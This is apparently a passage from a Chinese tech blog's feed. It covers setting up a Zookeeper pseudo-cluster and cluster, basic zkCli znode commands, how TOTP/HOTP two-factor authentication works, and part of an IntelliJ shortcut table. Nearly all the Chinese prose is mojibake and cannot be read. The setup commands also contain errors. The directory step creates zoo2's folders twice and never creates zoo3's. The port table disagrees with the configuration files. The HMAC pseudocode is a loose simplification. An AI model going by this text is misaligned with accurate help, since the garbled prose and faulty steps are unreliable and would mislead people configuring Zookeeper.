</p><table><thead><tr><th>myid</th><th>Dataç›®å½•</th><th>Client</th><th>Server</th><th>Leader</th><th>é…ç½®æ–‡ä»¶</th></tr></thead><tbody><tr><td>1</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1&#x2F;data</td><td>2181</td><td>2222</td><td>2223</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1.cfg</td></tr><tr><td>2</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo2&#x2F;data</td><td>2182</td><td>3333</td><td>3334</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo2.cfg</td></tr><tr><td>3</td><td>&#x2F;data&#x2F;zookeeper&#x2F;cluster&#x2F;zoo3&#x2F;data</td><td>2183</td><td>4444</td><td>4445</td><td>&#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo3.cfg</td></tr></tbody></table><ol><li><p>åˆ›å»ºå¤šä»½é…ç½®æ–‡ä»¶åˆå§‹åŒ–æ•°æ®ç›®å½•</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/zookeeper/cluster</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo1.cfg</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo2.cfg</span><br><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/cluster/zoo3.cfg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo1/data /data/zookeeper/cluster/zoo1/logs</span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo2/data /data/zookeeper/cluster/zoo2/logs</span><br><span class="line">mkdir -p /data/zookeeper/cluster/zoo2/data /data/zookeeper/cluster/zoo2/logs</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;cluster&#x2F;zoo1.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/cluster/zoo1/data</span><br><span class="line">dataLogDir=/data/zookeeper/cluster/zoo1/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br><span class="line"></span><br><span class="line"># é›†ç¾¤é…ç½®</span><br><span class="line">server.1=127.0.0.1:2222:2225  </span><br><span class="line">server.2=127.0.0.1:3333:3335  </span><br><span class="line">server.3=127.0.0.1:4444:4445</span><br></pre></td></tr></table></figure><p> é›†ç¾¤é…ç½®æ ¼å¼<code>server.A=B:C:D</code>å…¶ä¸­ A æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºè¿™ä¸ªæ˜¯ç¬¬å‡ å·æœåŠ¡å™¨ï¼ˆåœ¨æ•°æ®ç›®å½•çš„ myid ä¸­çš„å€¼å’Œå®ƒä¸€æ ·ï¼‰ï¼›B æ˜¯è¿™ä¸ªæœåŠ¡å™¨çš„ ip åœ°å€ï¼›C è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªæœåŠ¡å™¨ä¸é›†ç¾¤ä¸­çš„ Leader æœåŠ¡å™¨äº¤æ¢ä¿¡æ¯çš„ç«¯å£ï¼›D è¡¨ç¤ºçš„æ˜¯ä¸‡ä¸€é›†ç¾¤ä¸­çš„ Leader æœåŠ¡å™¨æŒ‚äº†ï¼Œéœ€è¦ä¸€ä¸ªç«¯å£æ¥é‡æ–°è¿›è¡Œé€‰ä¸¾ï¼Œé€‰å‡ºä¸€ä¸ªæ–°çš„ Leaderï¼Œè€Œè¿™ä¸ªç«¯å£å°±æ˜¯ç”¨æ¥æ‰§è¡Œé€‰ä¸¾æ—¶æœåŠ¡å™¨ç›¸äº’é€šä¿¡çš„ç«¯å£ã€‚å¦‚æœæ˜¯ä¼ªé›†ç¾¤çš„é…ç½®æ–¹å¼ï¼Œç”±äº B éƒ½æ˜¯ä¸€æ ·ï¼Œæ‰€ä»¥ä¸åŒçš„ Zookeeper å®ä¾‹é€šä¿¡ç«¯å£å·ä¸èƒ½ä¸€æ ·ï¼Œæ‰€ä»¥è¦ç»™å®ƒä»¬åˆ†é…ä¸åŒçš„ç«¯å£å·ã€‚</p><p> åœ¨æ¯ä¸ªæ•°æ®å­˜å‚¨ç›®å½•æ–°å»º myid æ–‡ä»¶ï¼Œå†™å…¥æœåŠ¡å™¨ IDã€‚</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch /data/zookeeper/cluster/zoo1/data/myid /data/zookeeper/cluster/zoo2/data/myid /data/zookeeper/cluster/zoo3/data/myid</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /data/zookeeper/cluster/zoo1/data/myid</span><br><span class="line">echo 2 &gt; /data/zookeeper/cluster/zoo2/data/myid</span><br><span class="line">echo 3 &gt; /data/zookeeper/cluster/zoo3/data/myid</span><br></pre></td></tr></table></figure><blockquote><p>æœåŠ¡å™¨äº¤äº’ç«¯å£ä¸éœ€è¦å•ç‹¬é…ç½®ï¼Œåªéœ€è¦é›†ç¾¤é…ç½®ä¸­å†™å¥½å°±è¡Œäº†ã€‚<br>åœ¨ä¼ªé›†é…ç½®ä¸­ï¼Œæ³¨æ„ clientPort ä¸è¦å†²çªï¼Œæ¯ä¸ªæœåŠ¡æœ‰å•ç‹¬çš„æ•°æ®ç›®å½•ã€‚</p></blockquote></li><li><p>å¯åŠ¨æœåŠ¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo1.cfg</span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo2.cfg</span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/cluster/zoo3.cfg</span><br></pre></td></tr></table></figure></li></ol><h4 id="é›†ç¾¤æ¨¡å¼é…ç½®"><a href="#é›†ç¾¤æ¨¡å¼é…ç½®" class="headerlink" title="é›†ç¾¤æ¨¡å¼é…ç½®"></a>é›†ç¾¤æ¨¡å¼é…ç½®</h4><p>é›†ç¾¤æ¨¡å¼å°±æ˜¯åœ¨ä¸åŒçš„æœºå™¨éƒ¨ç½²å¤šä¸ª Zookeeper æœåŠ¡ï¼Œç»„æˆä¸€ä¸ªé›†ç¾¤ã€‚è¿™ç§é…ç½®å¯ç”¨æ€§æ›´é«˜ã€‚</p><p>é›†ç¾¤é…ç½®å’Œä¼ªé›†ç¾¤é…ç½®åŸºæœ¬ä¸€æ ·ï¼Œä½†æ˜¯é›†ç¾¤é…ç½®ä¸­ç”±äºä¸åŒçš„æœºå™¨ï¼Œä½¿ç”¨èµ„æºä¸ä¼šå†²çªã€‚é…ç½®æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨åŒæ ·çš„ç«¯å£ï¼Œæ•°æ®æ–‡ä»¶ç›®å½•ã€‚</p><ol><li><p>åœ¨æ¯å°æœºå™¨ä¸Šåˆ›å»ºé…ç½®æ–‡ä»¶</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;zoo.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/data</span><br><span class="line">dataLogDir=/data/zookeeper/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br><span class="line"></span><br><span class="line"># é›†ç¾¤é…ç½®</span><br><span class="line">server.1=10.0.1.11:2222:2225  </span><br><span class="line">server.2=10.0.1.12:2222:2225  </span><br><span class="line">server.3=10.0.1.13:2222:2225</span><br></pre></td></tr></table></figure><p> åœ¨å„ä¸ªæœºå™¨çš„æ•°æ®ç›®å½•ä¸­å†™å…¥å“åº”çš„ myid æ–‡ä»¶ã€‚ä¾‹å¦‚ <code>10.0.1.11</code> æœºå™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch /data/zookeeper/data/myid</span><br><span class="line">echo 1 &gt; /data/zookeeper/data/myid</span><br></pre></td></tr></table></figure></li><li><p>åœ¨å„ä¸ªæœºå™¨ä¸­å¯åŠ¨ Zookeeper æœåŠ¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li></ol><h3 id="å®¢æˆ·ç«¯å‘½ä»¤"><a href="#å®¢æˆ·ç«¯å‘½ä»¤" class="headerlink" title="å®¢æˆ·ç«¯å‘½ä»¤"></a>å®¢æˆ·ç«¯å‘½ä»¤</h3><h4 id="é“¾æ¥åˆ°-Zookeeper"><a href="#é“¾æ¥åˆ°-Zookeeper" class="headerlink" title="é“¾æ¥åˆ° Zookeeper"></a>é“¾æ¥åˆ° Zookeeper</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bin/zkCli.sh -server 127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183</span><br></pre></td></tr></table></figure><h4 id="Zookeeper-ç›®å½•æ ‘æ“ä½œ"><a href="#Zookeeper-ç›®å½•æ ‘æ“ä½œ" class="headerlink" title="Zookeeper ç›®å½•æ ‘æ“ä½œ"></a>Zookeeper ç›®å½•æ ‘æ“ä½œ</h4><p>Zookeeperï¼Œå†…éƒ¨æ˜¯ä¸€ä¸ªåˆ†å±‚çš„æ–‡ä»¶ç³»ç»Ÿç›®å½•æ ‘ç»“æ„ï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªZnodeã€‚<a href="https://zookeeper.apache.org/doc/trunk/zookeeperStarted.html">å‚è€ƒ</a></p><p>æŸ¥çœ‹æ ¹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 8] ls /</span><br><span class="line">[zookeeper]</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ–°çš„Znode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 9] create /zk_test my_data</span><br><span class="line">Created /zk_test</span><br></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥çœ‹å°±èƒ½çœ‹åˆ°æ–°åˆ›å»ºçš„Znodeäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 11] ls /</span><br><span class="line">[zookeeper, zk_test]</span><br></pre></td></tr></table></figure><p>è¯»å–å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 12] get /zk_test</span><br><span class="line">my_data</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 5</span><br><span class="line">mtime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 0</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 7</span><br><span class="line">numChildren = 0</span><br></pre></td></tr></table></figure><p>é‡æ–°è®¾ç½®å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 14] set /zk_test junk</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 6</span><br><span class="line">mtime = Fri Jun 05 14:01:52 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 1</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 4</span><br><span class="line">numChildren = 0</span><br><span class="line">[zkshell: 15] get /zk_test</span><br><span class="line">junk</span><br><span class="line">cZxid = 5</span><br><span class="line">ctime = Fri Jun 05 13:57:06 PDT 2009</span><br><span class="line">mZxid = 6</span><br><span class="line">mtime = Fri Jun 05 14:01:52 PDT 2009</span><br><span class="line">pZxid = 5</span><br><span class="line">cversion = 0</span><br><span class="line">dataVersion = 1</span><br><span class="line">aclVersion = 0</span><br><span class="line">ephemeralOwner = 0</span><br><span class="line">dataLength = 4</span><br><span class="line">numChildren = 0</span><br></pre></td></tr></table></figure><p>åˆ é™¤Znode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[zkshell: 16] delete /zk_test</span><br><span class="line">[zkshell: 17] ls /</span><br><span class="line">[zookeeper]</span><br><span class="line">[zkshell: 18]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨åœºæ™¯åˆ†æ"><a href="#ä½¿ç”¨åœºæ™¯åˆ†æ" class="headerlink" title="ä½¿ç”¨åœºæ™¯åˆ†æ"></a>ä½¿ç”¨åœºæ™¯åˆ†æ</h3><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><h3 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h3><p><img src="/images/zk-dubbo2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dubbo://10.0.1.3:20880/cc.kekek.dubbo.demo.DemoService?anyhost=true&amp;application=demo-provider&amp;dubbo=2.5.7&amp;generic=false&amp;interface=cc.kekek.dubbo.demo.DemoService&amp;methods=sayHello,sayName&amp;pid=54299&amp;side=provider&amp;timestamp=1511263842858</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://taoistwar.gitbooks.io/spark-operationand-maintenance-management/content/spark_relate_software/zookeeper_install.html">ã€1ã€‘</a> <a href="http://www.jianshu.com/p/0ba61bf7149f">ã€2ã€‘</a> <a href="https://my.oschina.net/jackieyeah/blog/709130">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸¤æ­¥éªŒè¯</title>
      <link href="/post/2fa.html"/>
      <url>/post/2fa.html</url>
      
        <content type="html"><![CDATA[<h3 id="åŒé‡è®¤è¯"><a href="#åŒé‡è®¤è¯" class="headerlink" title="åŒé‡è®¤è¯"></a>åŒé‡è®¤è¯</h3><p>åŒé‡è®¤è¯ï¼ˆè‹±è¯­ï¼šTwo-factor authenticationï¼Œç¼©å†™ä¸º2FAï¼‰ï¼Œæ˜¯ä¸€ç§è®¤è¯æ–¹æ³•ï¼Œä½¿ç”¨ä¸¤ç§ä¸åŒçš„å…ƒç´ ï¼Œåˆå¹¶åœ¨ä¸€èµ·ï¼Œæ¥ç¡®è®¤ä½¿ç”¨è€…çš„èº«ä»½ï¼Œæ˜¯å¤šå› ç´ éªŒè¯ä¸­çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚ç›®å‰æµè¡Œçš„ä¸»è¦æ˜¯åŸºäºæ™ºèƒ½æ‰‹æœºçš„ä¸¤æ­¥éªŒè¯ï¼Œå…¶ä¸­ä¸»æµçš„åˆåˆ† APP æ–¹å¼å’ŒçŸ­ä¿¡æ–¹å¼ã€‚</p><h3 id="Google-Authenticator"><a href="#Google-Authenticator" class="headerlink" title="Google Authenticator"></a>Google Authenticator</h3><p>Google Authenticator æ˜¯ä¸€ç§ APP æ–¹å¼çš„ä¸¤æ­¥éªŒè¯ã€‚è°·æ­ŒéªŒè¯åº”ç”¨çš„ä½¿ç”¨æ–¹æ³•æ˜¯ï¼šç”¨æˆ·å®‰è£…æ‰‹æœºå®¢æˆ·ç«¯ï¼Œç”Ÿæˆä¸´æ—¶èº«ä»½éªŒè¯ç ï¼Œæäº¤åˆ°æœåŠ¡å™¨éªŒè¯èº«ä»½ã€‚</p><h4 id="Google-ä¸¤æ­¥éªŒè¯çš„åŸç†"><a href="#Google-ä¸¤æ­¥éªŒè¯çš„åŸç†" class="headerlink" title="Google ä¸¤æ­¥éªŒè¯çš„åŸç†"></a>Google ä¸¤æ­¥éªŒè¯çš„åŸç†</h4><p>æœåŠ¡å™¨é¦–å…ˆè¦ç»™æ¯ä¸ªç”¨æˆ·ç”Ÿæˆä¸€ä¸ª KEYï¼Œç„¶åæŒ‰ç…§ <code>HOTP</code>ï¼ˆHMAC-based One-time Passwordï¼‰ æˆ–è€… <code>TOTP</code>ï¼ˆTime-Based One-Time Passwordï¼‰ åè®®ç”Ÿæˆ <code>CODE</code>ï¼Œæ ¹æ®åè®®ä¸åŒï¼Œç”Ÿæˆçš„ <code>CODE</code> åˆ†åˆ«æ˜¯<code>åŸºäºè®¡æ•°</code>çš„æˆ–è€…<code>åŸºäºæ—¶é—´</code>çš„ã€‚<br><img src="/images/WechatIMG47.jpeg"></p><h4 id="TOTP"><a href="#TOTP" class="headerlink" title="TOTP"></a>TOTP</h4><ol><li><p>å…±äº«å¯†é’¥<br> æœåŠ¡å™¨ç«¯ç”Ÿæˆä¸€ä¸ª32ä½çš„å¯†é’¥ï¼Œå…±äº«ç»™å®¢æˆ·ç«¯ã€‚</p></li><li><p>å®¢æˆ·ç«¯ç”Ÿæˆéšæœºä»¤ç‰Œ<br> å®¢æˆ·ç«¯æ ¹æ®å½“å‰æ—¶é—´ç‰‡å’Œå…±äº«å¯†é’¥ç”Ÿæˆä¸€ä¸ªéšæœºä»¤ç‰Œã€‚</p><blockquote><p>è¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ç”¨æˆ·æ‰‹æœºæ—¶é—´è¦å‡†ç¡®</p></blockquote></li><li><p>æœåŠ¡å™¨éªŒç­¾<br> æœåŠ¡å™¨ç«¯æ ¹æ®å½“å‰æ—¶é—´å’Œå…±äº«å¯†é’¥ç”Ÿæˆä¸€ä¸ªéšæœºä»¤ç‰Œï¼Œä¸¤è€…æ¯”å¯¹ã€‚</p><blockquote><p>æœåŠ¡å™¨ä½¿ç”¨å’Œå®¢æˆ·ç«¯åŒæ ·çš„å…±äº«å¯†é’¥å’Œæ—¶é—´ç‰‡å¾—åˆ°çš„éšæœºä»¤ç‰Œï¼Œä¸¤è€…æ˜¯ä¸€æ ·çš„ã€‚  </p></blockquote><p> ä¼ªä»£ç </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hmac = SHA1(secret + SHA1(secret + input))</span><br></pre></td></tr></table></figure></li></ol><p>æœåŠ¡å™¨æ—¶é—´å’Œå®¢æˆ·ç«¯æ—¶é—´å¯èƒ½ä¸ä¸€è‡´ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´æœåŠ¡å™¨è®¡ç®—çš„ä»¤ç‰Œä¸ç”¨æˆ·è¾“å…¥çš„ä¸åŒï¼ŒéªŒè¯å¤±è´¥ã€‚è§£å†³è¿™ä¸ªé—®é¢˜ä¸ªä¸€ä¸ªæ–¹æ³•æ˜¯ï¼ŒæœåŠ¡å™¨è®¡ç®—å½“å‰æ—¶é—´ç‰‡ä»¥åŠå‰é¢çš„ n ä¸ªæ—¶é—´ç‰‡å†…çš„ä¸€æ¬¡æ€§å¯†ç å€¼ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªä¸ç”¨æˆ·è¾“å…¥çš„å¯†ç ç›¸åŒï¼Œåˆ™éªŒè¯é€šè¿‡ã€‚å½“ç„¶ï¼Œn ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šé™ä½å®‰å…¨æ€§ã€‚</p><h4 id="HOTP"><a href="#HOTP" class="headerlink" title="HOTP"></a>HOTP</h4><ol><li><p>å…±äº«å¯†é’¥å’Œè®¡æ•°å™¨<br> æœåŠ¡å™¨ç«¯ç”Ÿæˆä¸€ä¸ª32ä½å¯†é’¥ï¼Œå¦å¤–å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å„æœ‰ä¸€ä¸ªè®¡æ•°å™¨Cï¼Œå¹¶ä¸”äº‹å…ˆå°†è®¡æ•°å€¼åŒæ­¥ã€‚</p></li><li><p>å®¢æˆ·ç«¯ç”Ÿæˆéšæœºä»¤ç‰Œ<br> å®¢æˆ·ç«¯æ ¹æ®å…±äº«å¯†é’¥å’Œè®¡æ•°å™¨çš„ç»„åˆç”Ÿæˆä¸€ä¸ªç”Ÿæˆä¸€ä¸ªéšæœºä»¤ç‰Œï¼Œç”Ÿæˆåå®¢æˆ·ç«¯è®¡æ•°å™¨è®¡æ•°å€¼åŠ 1ã€‚</p></li><li><p>æœåŠ¡å™¨éªŒç­¾<br> æœåŠ¡å™¨åŒæ ·æ ¹æ®å…±äº«å¯†é’¥å’Œè®¡æ•°å™¨ç”Ÿæˆä¸€ä¸ªéšæœºä»¤ç‰Œï¼Œä¸¤è€…æ¯”å¯¹ã€‚å¦‚æœç›¸åŒï¼ŒæœåŠ¡å™¨è®¡æ•°å™¨åŠ 1ã€‚</p></li></ol><blockquote><p>å¦‚æœéªŒè¯å¤±è´¥æˆ–è€…å®¢æˆ·ç«¯ä¸å°å¿ƒå¤šè¿›è¡Œäº†ä¸€æ¬¡ç”Ÿæˆå¯†ç æ“ä½œï¼Œé‚£ä¹ˆæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è®¡æ•°å™¨Cå°†ä¸å†åŒæ­¥ï¼Œå› æ­¤éœ€è¦æœ‰ä¸€ä¸ªé‡æ–°åŒæ­¥ï¼ˆResynchronizationï¼‰çš„æœºåˆ¶ã€‚</p></blockquote><p><code>HOTP</code> ç®—æ³•ä¸­çš„è®¡æ•°å™¨ç±»ä¼¼äº <code>TOTP</code> ä¸­çš„æ—¶é—´ç‰‡ã€‚<code>TOTP</code> æ¥æ”¶å®Œå…±äº«å¯†é’¥åå°±ä¸éœ€è¦å’ŒæœåŠ¡å™¨è¿›è¡Œäº¤äº’äº†ï¼Œ<code>HOTP</code> åé¢è¿˜éœ€è¦å’ŒæœåŠ¡å™¨åŒæ­¥è®¡æ•°å™¨ã€‚è¿™æ ·çœ‹æ¥ <code>TOTP</code>çš„æ–¹å¼å¯ç”¨æ€§æ›´é«˜ï¼ˆç‰¹åˆ«æ˜¯åœ¨å›½å†…ä¸èƒ½è®¿é—®GoogleæœåŠ¡çš„æƒ…å†µä¸‹ï¼‰ï¼Œå®ç°ä¹Ÿæ›´åŠ ç®€å•ã€‚å¦å¤–ï¼Œä¸ºäº†å®‰å…¨ä¸¤è€…æœ¬åœ°çš„åŠŸæ•ˆå¯†é’¥éƒ½ä¸èƒ½è¢«ç¬¬ä¸‰æ–¹è·çŸ¥ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.zhihu.com/question/20462696">ã€1ã€‘</a> <a href="http://www.infoq.com/cn/news/2014/09/system-verification">ã€2ã€‘</a> <a href="http://blog.zlxstar.me/blog/2015/09/02/qian-tan-liang-bu-yan-zheng/">ã€3ã€‘</a> <a href="https://linux.cn/article-2641-1.html">ã€4ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 2fa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellijå¿«æ·é”®</title>
      <link href="/post/intellij-keymap.html"/>
      <url>/post/intellij-keymap.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>å¿«æ·é”®</th><th>ç”¨é€”</th><th></th><th></th></tr></thead><tbody><tr><td>esc</td><td>ä»å·¥å…·çª—å£è¿›å…¥ä»£ç æ–‡ä»¶çª—å£</td><td></td><td></td></tr><tr><td>cmd + alt + l</td><td>æ ¼å¼åŒ–</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + alt + b</td><td>è¿›å…¥æ–¹æ³•å®ç°å¤„</td><td>â­ï¸ â­ï¸</td><td></td></tr><tr><td>cmd + alt + â†</td><td>åé€€</td><td></td><td></td></tr><tr><td>cmd + alt + â†’</td><td>å‰è¿›</td><td></td><td></td></tr><tr><td>cmd + alt + m</td><td>é‡æ„æ–¹æ³•ã€å°†é€‰ä¸­çš„ä»£ç æå–ä¸ºæ–¹æ³•</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + alt + v</td><td>æå–å˜é‡</td><td></td><td></td></tr><tr><td>cmd + alt + f</td><td>æå–å­—æ®µ</td><td></td><td></td></tr><tr><td>cmd + alt + c</td><td>æå–å¸¸é‡</td><td></td><td></td></tr><tr><td>cmd + alt + p</td><td>æå–å‚æ•°</td><td></td><td></td></tr><tr><td>cmd + alt + o</td><td>ä¼˜åŒ–å¯¼å…¥çš„åŒ…</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + alt + t</td><td>åŒ…è£¹(if&#x2F;try-catch&#x2F;for)ä»£ç </td><td>â­ï¸</td><td></td></tr><tr><td>cmd + alt + j</td><td>å¼¹å‡ºæ¨¡æ¿é€‰æ‹©çª—å£ï¼Œå°†é€‰å®šçš„ä»£ç ä½¿ç”¨åŠ¨æ€æ¨¡æ¿åŒ…ä½</td><td></td><td></td></tr><tr><td>cmd + shift + enter</td><td>è‡ªåŠ¨å®Œæˆ</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + shift + u</td><td>å¤§å°å†™è½¬æ¢</td><td></td><td></td></tr><tr><td>cmd + shift + ]&#x2F;[</td><td>é€‰æ‹©ç›´åˆ°ä»£ç å—ç»“æŸ&#x2F;å¼€å§‹</td><td></td><td></td></tr><tr><td>cmd + shift + h</td><td>æ˜¾ç¤ºæ–¹æ³•å±‚æ¬¡ç»“æ„</td><td></td><td></td></tr><tr><td>cmd + n</td><td>æŸ¥æ‰¾ç±»</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + y\</td><td>x</td><td>åˆ é™¤å½“å‰è¡Œ</td><td></td></tr><tr><td>cmd + d</td><td>å¤åˆ¶å½“å‰è¡Œ</td><td></td><td></td></tr><tr><td>cmd + &#x2F;</td><td>æ³¨é‡Šè¡Œ &#x2F;&#x2F;</td><td></td><td></td></tr><tr><td>cmd + f</td><td>æœç´¢</td><td></td><td></td></tr><tr><td>cmd + r</td><td>æ›¿æ¢</td><td></td><td></td></tr><tr><td>cmd + w</td><td>æŒ‰ç…§è¯­æ³•é€‰ä¸­ä»£ç </td><td>â­ï¸</td><td></td></tr><tr><td>cmd + p</td><td>æ˜¾ç¤ºæ–¹æ³•çš„å‚æ•°ä¿¡æ¯</td><td></td><td></td></tr><tr><td>cmd + del</td><td>å®‰å…¨åˆ é™¤æ–‡ä»¶</td><td></td><td></td></tr><tr><td>cmd + o</td><td>é‡å†™çˆ¶ç±»æ–¹æ³•</td><td></td><td></td></tr><tr><td>cmd + i</td><td>å®ç°æ¥å£çš„æ–¹æ³•</td><td></td><td></td></tr><tr><td>cmd + 